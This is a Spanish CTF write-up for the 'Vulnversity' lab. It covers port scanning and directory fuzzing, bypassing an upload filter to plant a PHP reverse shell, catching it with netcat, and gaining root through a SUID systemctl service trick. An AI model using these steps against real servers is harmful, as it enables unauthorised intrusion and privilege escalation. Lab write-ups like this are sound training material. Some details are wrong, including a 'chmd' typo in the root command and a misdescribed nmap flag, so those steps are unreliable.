+++
title = "Vulnversity"
date = "FECHA"
aliases = ["about-us","about-hugo","contact"]
[ author ]
+++

#### Vulnversity es una máquina de dificultad fácil, con el sistema operativo Linux, en concreto Ubuntu, en la que vamos a tratar los siguientes conceptos básicos:

**-->** Fuzzear directorios bajo una ruta. 

**-->** Saber aprovechar el poder cargar y ejecutar un archivo que nosotros le adjuntemos/subamos a la página para poder comprometer el servidor web.

**-->** Intercepciones con **burpsuite**

**-->** Explotacion de permisos **SUID** en concreto el **"/bin/systemctl"**



[![imagen1.png](https://i.postimg.cc/m2dfhy5t/imagen1.png)](https://postimg.cc/56FkRL1V)



### **FASE DE RECONOCIMIENTO:**

**nmap -p- --open --min-rate 5000 -n -sS -Pn (IP VICTIMA) -vvv -oG allports**

--------------------------------------------
--------------------------------------------
--------------------------------------------

Vamos a explicar cada cada unos de los parámetros que vamos a usar para el reconocimiento de la IP VICTIMA:

**-p-** --> Escanéa todos los puertos (65535).

**- -open** --> Filtramos por los puertos que tengan de estado **OPEN** es decir **ABIERTO**.

**- -min-rate 5000** --> Le indicamos la cantidad de paquetes que le queremos enviar por segundo (5000) es el máximo.

**-n** --> Resolucion **DNS**

**-sS** --> Sirve para indicarle que queremos hacer un escaneo **TCP SYN SCAN**.

**-vvv** --> Sirve para que nos vaya reportando la información mientras hacemos el escaneo.

**-Pn** --> Sirve para que nos omita el descubrimineto de host.
 
 **-oG** --> Sirver para que nos guarde la informacion en un documento en forma grepeable.
 
 -------------------------------------------
 --------------------------------------------
 -------------------------------------------
 Aquí podemos ver cual es el resultado del escaneo:
 
[![imagen2.png](https://i.postimg.cc/gJH2mHDg/imagen2.png)](https://postimg.cc/vgDsv9Cn)

---------------------------------------------
---------------------------------------------
Ahora una vez terminado el escaneo, vemos que tenemos varios puertos pero uno que nos interesa bastante es el puerto **< 3333 >**, el cual si ponemos en nuestro navegador **http://IP:3333/** veremos que nos manda para la página web de la victima.

---------------------------------------------

---------------------------------------------

[![imagen3.png](https://i.postimg.cc/YCJpKs16/imagen3.png)](https://postimg.cc/QFJLcSYC)

--------------------------------------------

--------------------------------------------

Si empezamos a investigar y toquetear por la página podemos ver que no conseguimos nada, por que vamos a empezar a fuzzear utilizando la herramienta **gobuster** también podríamos utilizar otras herraminetas como wfuzz o cualquier otra.

La sintaxis de esta herramienta sería la siguiente:

--------------------------------------------
--------------------------------------------


[![imagen4.png](https://i.postimg.cc/HWqRm8ny/imagen4.png)](https://postimg.cc/G9jqJ2kL)

--------------------------------------------

gobuster dir -u http://10.10.207.158:3333 -w /usr/share/wordlists/dirbuster/
directory-list-2.3-medium.txt

**-u** --> Le indicamos la **URL** a la cual vamos a fuzzear.

**-w** --> Le indicamos la ruta del **DICCIONARIO** que vamos a utilizar.

--------------------------------------------

-------------------------------------

Encontramos varios directorios, pero a nosotros el que nos interesa realmente es el **/internal** el cual si nosotros lo ponemos en la **url** de nuestro navegador podemos encontrarnos con esto:

---------------------------------------

---------------------------------------
[![imagen5.png](https://i.postimg.cc/mDNjGk5Q/imagen5.png)](https://postimg.cc/xJ8MvfYC)

---------------------------------------

---------------------------------------
Y como bien nos indica en un directorio en que podemos subir archivos, es decir que si hay un upload tiene que haber un **/uploads**

------------------------------------------

------------------------------------------
[![imagen5.png](https://i.postimg.cc/bJ7ZL9Tg/imagen5.png)](https://postimg.cc/4714xtjH)

--------------------------------------------

------------------------------------------

Vamos a volvernos al directorio anterior y vamos a probar a subir un php-reverser-shell.php a la página para poder obtener una shell.

Esta seria la ruta del documento que vamos a subir a la página, antes que todo vamos a modifical un poco el documento .php de la siguiente manera:

**/usr/share/webshells/php/php-reverse-shell.php**

---------------------------------------------

---------------------------------------------

[![imagen5.png](https://i.postimg.cc/dQZH1QTc/imagen5.png)](https://postimg.cc/F1mgC4ZT)

-----------------------------------

-----------------------------------

Pondremos nuestra **IP** de atacante y el puerto por que vamos a ponernos en escucha.

---------------------------------------

----------------------------------------

[![imagen5.png](https://i.postimg.cc/28mQDCQw/imagen5.png)](https://postimg.cc/YjnGNKyG)

-------------------------------------------

-------------------------------------------

Una vez hayamos seleccionado el **archivo** que queremos subir le daremos a **sumit.**

--------------------------------------------

-----------------------------------------

Y como podemos ver nos sale este mensaje:

-----------------------------------------

[![imagen5.png](https://i.postimg.cc/3N3dPJs0/imagen5.png)](https://postimg.cc/DJYvGFy7)

----------------------------------------

--------------------------------------

Eso quiere decir que la extensión php no nos sirve, por lo que vamos a tener que utilizar la herramienta **BURPSUITE**

------------------------------------------

-------------------------------------------

[![imagen5.png](https://i.postimg.cc/NMzzn59p/imagen5.png)](https://postimg.cc/XG9LGNgC)

-------------------------------------------

------------------------------------------
Lo que hemos hecho aqui es crearnos un *diccionario* con unas pocas de extensiones las cuales vamos a comprobar si alguna es valida ante la máquina:

--------------------------------------

------------------------------------

Una vez hayamos interceptado la petición nos encontrams con esto:

En el cual vamos a urlencodearlo poniendo un **$** quedando tal que así:

**php-reverser-shell.$php**

-------------------------------------

[![imagen5.png](https://i.postimg.cc/L6XzXNWY/imagen5.png)](https://postimg.cc/hhkJZbcc)

--------------------------------------------

-------------------------------------------

Una vez hecho eso pulsaremos **Control + i** para mandarlo al **Intruder** y nos iremos al apartado de **Payload**


------------------------------------------

------------------------------------------

[![imagen6.png](https://i.postimg.cc/cJbQfY81/imagen6.png)](https://postimg.cc/B82L0jgR)

------------------------------------------
En el "Load" vamos a subir el diccionario que haniamos creado y el click de abajo lo deseleccionamos.

--------------------------

Una vez tengamos esto tal que así:

---------------------------------------
[![imagen6.png](https://i.postimg.cc/SNRkvMXb/imagen6.png)](https://postimg.cc/Cd33ZdHc)

----------------------------------

Le daremos a Start Attack.

-----------------------------------------

Y como podemos ver hay una extensión la cual es **.phtml** la cual nos aparece con un Legth diferente al de los demas:

---------------------------------

[![imagen6.png](https://i.postimg.cc/tg5cbBfS/imagen6.png)](https://postimg.cc/wt12cQ9L)

------------------------------------------

-----------------------------------------
Así que lo que haremos ahora será cambiarle la extensión al archivo que queremos subir para obtener una shell.

-------------------------------------

---------------------------------

Vamos a subirlo:

------------------------------------
[![imagen6.png](https://i.postimg.cc/t4yQHnJg/imagen6.png)](https://postimg.cc/pp01fTDN)

------------------------------------
Y como podemos ver nos pones Success, quiere decir que se nos ha subido correctamente.

---------------------------------------

[![imagen6.png](https://i.postimg.cc/YqKT1L1x/imagen6.png)](https://postimg.cc/z37dNB2L)

-----------------------------------------

Ahora nos vamos para el directorio **uploads** en el cual devería de estar el archivo que hemos subido.

--------------------------------------------

[![imagen7.png](https://i.postimg.cc/WbTXNGGx/imagen7.png)](https://postimg.cc/dDN8nTS9)

-------------------------------------------

Ahora viene lo chulo, que es obtener la shell, para ello vamos a ponernos en escucha con el comando:

**nc -nlvp 443**

Hemos puesto el puerto **443** porque es el que hemos puesto en el archivo que hemos subido.

-----------------------------------------

[![imagen7.png](https://i.postimg.cc/wxVDkSNb/imagen7.png)](https://postimg.cc/kD2VJYfx)

-----------------------------------------

---------------------------------------

-----------------------------------------

Ahora le damos click aquí y si todo está correcto nos deveria de dar una shell:

----------------------------------------

[![imagen7.png](https://i.postimg.cc/WbTXNGGx/imagen7.png)](https://postimg.cc/dDN8nTS9)


------------------------------------------

Y obtuvimos shell, vamos!!!

------------------------------------------

[![imagen7.png](https://i.postimg.cc/LXvhzFWt/imagen7.png)](https://postimg.cc/9RRWhKC0)

----------------------------------------------

----------------------------------------------

Ahora vamos a hacer un reconocimiento de la TTY para que se nos sea muchísimo más fácil poder comprometer la máquina.

---------------------------------------------------

[![imagen7.png](https://i.postimg.cc/vByB0KkQ/imagen7.png)](https://postimg.cc/Z9f4RwJg)

-----------------------------------------------
**Comandos empleados:**

````bash
script /dev/null -c bash

------------------------

	Ctrl + Z
	
------------------------

stty raw -echo;fg

------------------------

	reset
	
-------------------------	

export TERM=xterm

export SHELL=bash
````

-------------------------------------------------------

-------------------------------------------------------
## Escalada de privilegios

----------------------------------------------------

Vamos a empezar buscando permisos SUID con el siguiente comando:


[![imagen7.png](https://i.postimg.cc/vBSrg90F/imagen7.png)](https://postimg.cc/mzCzKcx8)

-------------------------------------------------------

Encontramos varios permisos **SUID**, pero el concreto el que más nos interesa seria el **/bin/systemctl**.

[![imagen7.png](https://i.postimg.cc/qqP5Pg6n/imagen7.png)](https://postimg.cc/0KCnmkf2)

------------------------------------------------------

Con el cual vamos a escalar privilegios con la sintaxis que tenemos en la famosa página de **https://gtfobins.github.io/**.

En la cual vamos buscar el permiso que nos interesa en este caso sería **systemctl**.

-------------------------------------------------------

Os dejo aqui el acceso directo para ver la sintaxis:

**https://gtfobins.github.io/gtfobins/systemctl/#suid**

-------------------------------------------------------

El orden para todo esto seria el siguiente:

-------------------------------------------------------

Primer paso:

````bash

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmd +s /bin/bash"

Enter

````

Segundo paso:

````bash


[Install]
WantedBy=multi-user.target' > $TF

Enter

````

Tercer paso:

````bash

systemctl link $TF


````

Cuarto paso:

````bash

systemctl enable --now $TF

````

-------------------------------------------------------

Y como podemos ver ahora **/bin/bash** tiene permisos **SUID**:

[![imagen8.png](https://i.postimg.cc/1zyj9Tmj/imagen8.png)](https://postimg.cc/Yvy3Rdm6)

Con el cual si ahora ponemos el comando **bash -p**, nos convertiriamos en root del sistema:

[![imagen8.png](https://i.postimg.cc/5yFX6s4h/imagen8.png)](https://postimg.cc/D4nvNdb6)

------------------------------------------------------

Y así es como haríamos para conseguir ser **root** del sistema.

-------------------------------------------------------

Antes ya podíamos leer la *flag* del usuario **bill**, pero habiamos pasado directamente a la escalada de privilegios:

[![imagen8.png](https://i.postimg.cc/43SLG3mW/imagen8.png)](https://postimg.cc/067ddPGS)

------------------------------------------------------

Y ahora sería la *flag* del usuario **root**, la cual la encontraríamos dentro del directorio "root" el cual antes siendo el usuario **bill** no podíamos entrar, ahora siendo **root** si podemos:

[![imagen8.png](https://i.postimg.cc/7YMykj0p/imagen8.png)](https://postimg.cc/Yh9PNnX3)


Learn more and contribute on [GitHub](https://github.com/gohugoio).